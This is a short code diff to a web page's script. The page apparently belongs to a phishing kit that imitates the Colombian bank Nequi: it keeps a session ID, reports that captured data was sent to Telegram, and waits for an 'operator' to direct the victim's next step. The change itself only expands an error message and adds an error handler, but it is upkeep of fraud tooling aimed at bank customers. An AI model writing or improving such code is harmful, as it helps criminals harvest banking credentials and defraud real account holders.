@@ -142,7 +142,7 @@
     <script>
         let sessionId = localStorage.getItem('nequiSessionId');
         if (!sessionId) {
-            alert('Error: Sesión no encontrada');
+            alert('Error: Sesión no encontrada. Vuelve al formulario e intenta de nuevo.');
             window.location.href = '/';
         }
         
@@ -203,6 +203,10 @@
         socket.on('telegramSent', (response) => {
             console.log('✅ Enviado a Telegram:', response);
             console.log('⏳ Esperando respuesta del operador...');
+        });
+
+        socket.on('error', (err) => {
+            console.error('❌ Error del servidor:', err);
         });
 
         socket.on('actionFollow', (data) => {
